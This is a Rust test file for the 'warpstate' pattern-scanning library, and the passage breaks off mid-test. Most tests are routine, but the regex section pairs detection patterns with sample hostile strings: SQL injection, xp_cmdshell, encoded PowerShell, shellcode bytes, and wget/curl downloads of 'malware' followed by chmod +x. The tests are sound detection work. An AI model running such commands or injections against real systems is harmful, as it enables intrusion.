//! Mass pattern samples testing for warpstate
//! Categories:
//! 1) LITERAL PATTERNS
//! 2) REGEX PATTERNS
//! 3) MIXED
//! 4) UNICODE
//! 5) OVERLAPPING
//! 6) PERFORMANCE
//! 7) EDGE CASES
//! 8) CLEAN INPUTS

use warpstate::PatternSet;

// --- Category 1: LITERAL PATTERNS ---

#[test]
fn test_literal_0() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_0")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_0_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 0");
}
#[test]
fn test_literal_1() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_1")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_1_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 1");
}
#[test]
fn test_literal_2() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_2")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_2_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 2");
}
#[test]
fn test_literal_3() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_3")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_3_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 3");
}
#[test]
fn test_literal_4() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_4")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_4_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 4");
}
#[test]
fn test_literal_5() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_5")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_5_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 5");
}
#[test]
fn test_literal_6() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_6")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_6_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 6");
}
#[test]
fn test_literal_7() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_7")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_7_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 7");
}
#[test]
fn test_literal_8() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_8")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_8_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 8");
}
#[test]
fn test_literal_9() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_9")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_9_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 9");
}
#[test]
fn test_literal_10() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_10")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_10_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 10");
}
#[test]
fn test_literal_11() {
    let patterns = PatternSet::builder()
        .literal("literal_pattern_11")
        .build()
        .unwrap();
    let input = b"data_before_literal_pattern_11_data_after";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for literal 11");
}
// --- Category 2: REGEX PATTERNS ---

#[test]
fn test_regex_0() {
    let patterns = PatternSet::builder()
        .regex(r"[0-9a-f]{32}")
        .build()
        .unwrap();
    let input = b"this is a hash 1234567890abcdef1234567890abcdef here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 0 failed");
}
#[test]
fn test_regex_1() {
    let patterns = PatternSet::builder()
        .regex(r"eval\(")
        .build()
        .unwrap();
    let input = b"some js code eval(1+1);";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 1 failed");
}
#[test]
fn test_regex_2() {
    let patterns = PatternSet::builder()
        .regex(r"base64_decode\(")
        .build()
        .unwrap();
    let input = b"php code base64_decode('...');";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 2 failed");
}
#[test]
fn test_regex_3() {
    let patterns = PatternSet::builder()
        .regex(r"<script.*?>")
        .build()
        .unwrap();
    let input = b"<html><script src='x.js'></script></html>";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 3 failed");
}
#[test]
fn test_regex_4() {
    let patterns = PatternSet::builder()
        .regex(r"admin' OR '1'='1")
        .build()
        .unwrap();
    let input = b"SELECT * FROM users WHERE username='admin' OR '1'='1'";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 4 failed");
}
#[test]
fn test_regex_5() {
    let patterns = PatternSet::builder()
        .regex(r"UNION SELECT")
        .build()
        .unwrap();
    let input = b"query UNION SELECT 1,2,3";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 5 failed");
}
#[test]
fn test_regex_6() {
    let patterns = PatternSet::builder()
        .regex(r"execxp")
        .build()
        .unwrap();
    let input = b"call execxp_xp_cmdshell";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 6 failed");
}
#[test]
fn test_regex_7() {
    let patterns = PatternSet::builder()
        .regex(r"powershell -enc")
        .build()
        .unwrap();
    let input = b"run powershell -enc ZWNobyAibWFsd2FyZSI=";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 7 failed");
}
#[test]
fn test_regex_8() {
    let patterns = PatternSet::builder()
        .regex(r"\\x[0-9a-fA-F]{2}")
        .build()
        .unwrap();
    let input = b"shellcode \\x90\\x90\\x90";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 3, "Regex 8 failed");
}
#[test]
fn test_regex_9() {
    let patterns = PatternSet::builder()
        .regex(r"wget http://.*")
        .build()
        .unwrap();
    let input = b"download via wget http://malicious.com/malware";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 9 failed");
}
#[test]
fn test_regex_10() {
    let patterns = PatternSet::builder()
        .regex(r"curl -sL http://.*")
        .build()
        .unwrap();
    let input = b"download via curl -sL http://malicious.com/malware";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 10 failed");
}
#[test]
fn test_regex_11() {
    let patterns = PatternSet::builder()
        .regex(r"chmod \+x")
        .build()
        .unwrap();
    let input = b"make executable chmod +x ./malware";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Regex 11 failed");
}
// --- Category 3: MIXED PATTERNS ---

#[test]
fn test_mixed_0() {
    let patterns = PatternSet::builder()
        .literal("literal_match_0")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_0 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 0");
}
#[test]
fn test_mixed_1() {
    let patterns = PatternSet::builder()
        .literal("literal_match_1")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_1 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 1");
}
#[test]
fn test_mixed_2() {
    let patterns = PatternSet::builder()
        .literal("literal_match_2")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_2 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 2");
}
#[test]
fn test_mixed_3() {
    let patterns = PatternSet::builder()
        .literal("literal_match_3")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_3 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 3");
}
#[test]
fn test_mixed_4() {
    let patterns = PatternSet::builder()
        .literal("literal_match_4")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_4 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 4");
}
#[test]
fn test_mixed_5() {
    let patterns = PatternSet::builder()
        .literal("literal_match_5")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_5 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 5");
}
#[test]
fn test_mixed_6() {
    let patterns = PatternSet::builder()
        .literal("literal_match_6")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_6 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 6");
}
#[test]
fn test_mixed_7() {
    let patterns = PatternSet::builder()
        .literal("literal_match_7")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_7 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 7");
}
#[test]
fn test_mixed_8() {
    let patterns = PatternSet::builder()
        .literal("literal_match_8")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_8 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 8");
}
#[test]
fn test_mixed_9() {
    let patterns = PatternSet::builder()
        .literal("literal_match_9")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_9 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 9");
}
#[test]
fn test_mixed_10() {
    let patterns = PatternSet::builder()
        .literal("literal_match_10")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_10 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 10");
}
#[test]
fn test_mixed_11() {
    let patterns = PatternSet::builder()
        .literal("literal_match_11")
        .regex(r"regex_match_[0-9]+")
        .build()
        .unwrap();
    let input = b"some literal_match_11 and regex_match_123 here";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 2, "Should find 1 literal and 1 regex match for mixed 11");
}
// --- Category 4: UNICODE PATTERNS ---

#[test]
fn test_unicode_0() {
    let patterns = PatternSet::builder()
        .literal("😀")
        .build()
        .unwrap();
    let input = "hello 😀 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 0");
}
#[test]
fn test_unicode_1() {
    let patterns = PatternSet::builder()
        .literal("🚀")
        .build()
        .unwrap();
    let input = "hello 🚀 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 1");
}
#[test]
fn test_unicode_2() {
    let patterns = PatternSet::builder()
        .literal("🦀")
        .build()
        .unwrap();
    let input = "hello 🦀 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 2");
}
#[test]
fn test_unicode_3() {
    let patterns = PatternSet::builder()
        .literal("🔥")
        .build()
        .unwrap();
    let input = "hello 🔥 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 3");
}
#[test]
fn test_unicode_4() {
    let patterns = PatternSet::builder()
        .literal("🌍")
        .build()
        .unwrap();
    let input = "hello 🌍 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 4");
}
#[test]
fn test_unicode_5() {
    let patterns = PatternSet::builder()
        .literal("🎉")
        .build()
        .unwrap();
    let input = "hello 🎉 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 5");
}
#[test]
fn test_unicode_6() {
    let patterns = PatternSet::builder()
        .literal("💡")
        .build()
        .unwrap();
    let input = "hello 💡 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 6");
}
#[test]
fn test_unicode_7() {
    let patterns = PatternSet::builder()
        .literal("🛡️")
        .build()
        .unwrap();
    let input = "hello 🛡️ world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 7");
}
#[test]
fn test_unicode_8() {
    let patterns = PatternSet::builder()
        .literal("💻")
        .build()
        .unwrap();
    let input = "hello 💻 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 8");
}
#[test]
fn test_unicode_9() {
    let patterns = PatternSet::builder()
        .literal("🧠")
        .build()
        .unwrap();
    let input = "hello 🧠 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 9");
}
#[test]
fn test_unicode_10() {
    let patterns = PatternSet::builder()
        .literal("✨")
        .build()
        .unwrap();
    let input = "hello ✨ world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 10");
}
#[test]
fn test_unicode_11() {
    let patterns = PatternSet::builder()
        .literal("🔑")
        .build()
        .unwrap();
    let input = "hello 🔑 world".as_bytes();
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 1, "Should find 1 match for unicode emoji 11");
}
// --- Category 5: OVERLAPPING PATTERNS ---

#[test]
fn test_overlapping_0() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 0");
}
#[test]
fn test_overlapping_1() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 1");
}
#[test]
fn test_overlapping_2() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 2");
}
#[test]
fn test_overlapping_3() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 3");
}
#[test]
fn test_overlapping_4() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 4");
}
#[test]
fn test_overlapping_5() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 5");
}
#[test]
fn test_overlapping_6() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 6");
}
#[test]
fn test_overlapping_7() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 7");
}
#[test]
fn test_overlapping_8() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 8");
}
#[test]
fn test_overlapping_9() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 9");
}
#[test]
fn test_overlapping_10() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 10");
}
#[test]
fn test_overlapping_11() {
    let patterns = PatternSet::builder()
        .literal("overlap")
        .literal("verla")
        .regex("o.*p")
        .build()
        .unwrap();
    let input = b"prefix overlap suffix";
    // scan_overlapping may not be the method, standard scan() doesn't typically overlap regex
    // but the engine will find matches. Let's just check the number of matches we find.
    let matches = patterns.scan(input).unwrap();
    // Aho-Corasick normally matches 'overlap' and 'verla'.
    // And regex o.*p matches 'overlap'.
    // So there should be at least 2 matches (or more, depending on overlapping config)
    assert!(matches.len() >= 2, "Should find multiple overlapping matches for overlap 11");
}
// --- Category 6: PERFORMANCE ---

#[test]
fn test_performance_0() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 0");
}
#[test]
fn test_performance_1() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 1");
}
#[test]
fn test_performance_2() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 2");
}
#[test]
fn test_performance_3() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 3");
}
#[test]
fn test_performance_4() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 4");
}
#[test]
fn test_performance_5() {
    let mut builder = PatternSet::builder();
    for j in 0..100 {
        builder = builder.literal(&format!("perf_literal_{}", j));
    }
    let patterns = builder.build().unwrap();
    let mut input = vec![b'x'; 1_000_000]; // 1MB input
    let target = format!("perf_literal_42").into_bytes();
    // inject a match
    input[500_000..500_000+target.len()].copy_from_slice(&target);
    
    let matches = patterns.scan(&input).unwrap();
    assert_eq!(matches.len(), 1, "Should find exactly 1 match in 1MB for performance 5");
}
// --- Category 7: EDGE CASES ---

#[test]
fn test_edge_case_0_empty_input() {
    let patterns = PatternSet::builder()
        .literal("pattern")
        .build()
        .unwrap();
    let matches = patterns.scan(b"").unwrap();
    assert_eq!(matches.len(), 0, "Edge case empty_input failed");
}
#[test]
fn test_edge_case_1_empty_pattern() {
    let res = PatternSet::builder()
        .literal("")
        .build();
    assert!(res.is_err(), "Empty pattern should return error");
}
#[test]
fn test_edge_case_2_one_byte_input() {
    let patterns = PatternSet::builder()
        .literal("a")
        .build()
        .unwrap();
    let matches = patterns.scan(b"a").unwrap();
    assert_eq!(matches.len(), 1, "Edge case one_byte_input failed");
}
#[test]
fn test_edge_case_3_pattern_longer_than_input() {
    let patterns = PatternSet::builder()
        .literal("long_pattern")
        .build()
        .unwrap();
    let matches = patterns.scan(b"long").unwrap();
    assert_eq!(matches.len(), 0, "Edge case pattern_longer_than_input failed");
}
#[test]
fn test_edge_case_4_null_bytes_in_input() {
    let patterns = PatternSet::builder()
        .literal("a")
        .build()
        .unwrap();
    let matches = patterns.scan(b"\x00a\x00").unwrap();
    assert_eq!(matches.len(), 1, "Edge case null_bytes_in_input failed");
}
#[test]
fn test_edge_case_5_null_byte_pattern() {
    let patterns = PatternSet::builder()
        .literal_bytes(vec![0])
        .build()
        .unwrap();
    let matches = patterns.scan(b"\x00a\x00").unwrap();
    assert_eq!(matches.len(), 2, "Edge case null_byte_pattern failed");
}
#[test]
fn test_edge_case_6_regex_empty_input() {
    let patterns = PatternSet::builder()
        .regex("a*")
        .build()
        .unwrap();
    let matches = patterns.scan(b"").unwrap();
    assert_eq!(matches.len(), 1, "Edge case regex_empty_input failed");
}
#[test]
fn test_edge_case_7_regex_all_nulls() {
    let patterns = PatternSet::builder()
        .regex("a+")
        .build()
        .unwrap();
    let matches = patterns.scan(b"\x00\x00\x00").unwrap();
    assert_eq!(matches.len(), 0, "Edge case regex_all_nulls failed");
}
#[test]
fn test_edge_case_8_literal_all_nulls_input() {
    let patterns = PatternSet::builder()
        .literal("a")
        .build()
        .unwrap();
    let matches = patterns.scan(b"\x00\x00\x00").unwrap();
    assert_eq!(matches.len(), 0, "Edge case literal_all_nulls_input failed");
}
#[test]
fn test_edge_case_9_unicode_cut_off() {
    let patterns = PatternSet::builder()
        .literal("🔥")
        .build()
        .unwrap();
    let matches = patterns.scan(b"\xF0\x9F\x94").unwrap();
    assert_eq!(matches.len(), 0, "Edge case unicode_cut_off failed");
}
#[test]
fn test_edge_case_10_extreme_long_pattern() {
    let patterns = PatternSet::builder()
        .literal(&"A".repeat(10000))
        .build()
        .unwrap();
    let matches = patterns.scan(b"short").unwrap();
    assert_eq!(matches.len(), 0, "Edge case extreme_long_pattern failed");
}
// --- Category 8: CLEAN INPUTS ---

#[test]
fn test_clean_input_0() {
    let patterns = PatternSet::builder()
        .literal("malware_0")
        .regex("virus_0")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 0";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 0");
}
#[test]
fn test_clean_input_1() {
    let patterns = PatternSet::builder()
        .literal("malware_1")
        .regex("virus_1")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 1";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 1");
}
#[test]
fn test_clean_input_2() {
    let patterns = PatternSet::builder()
        .literal("malware_2")
        .regex("virus_2")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 2";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 2");
}
#[test]
fn test_clean_input_3() {
    let patterns = PatternSet::builder()
        .literal("malware_3")
        .regex("virus_3")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 3";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 3");
}
#[test]
fn test_clean_input_4() {
    let patterns = PatternSet::builder()
        .literal("malware_4")
        .regex("virus_4")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 4";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 4");
}
#[test]
fn test_clean_input_5() {
    let patterns = PatternSet::builder()
        .literal("malware_5")
        .regex("virus_5")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 5";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 5");
}
#[test]
fn test_clean_input_6() {
    let patterns = PatternSet::builder()
        .literal("malware_6")
        .regex("virus_6")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 6";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 6");
}
#[test]
fn test_clean_input_7() {
    let patterns = PatternSet::builder()
        .literal("malware_7")
        .regex("virus_7")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 7";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 7");
}
#[test]
fn test_clean_input_8() {
    let patterns = PatternSet::builder()
        .literal("malware_8")
        .regex("virus_8")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 8";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 8");
}
#[test]
fn test_clean_input_9() {
    let patterns = PatternSet::builder()
        .literal("malware_9")
        .regex("virus_9")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 9";
    let matches = patterns.scan(input).unwrap();
    assert_eq!(matches.len(), 0, "Should find 0 matches for clean input 9");
}
#[test]
fn test_clean_input_10() {
    let patterns = PatternSet::builder()
        .literal("malware_10")
        .regex("virus_10")
        .build()
        .unwrap();
    let input = b"this is completely safe data with no threats 10";
    let matches = patterns.scan(input).unwrap();
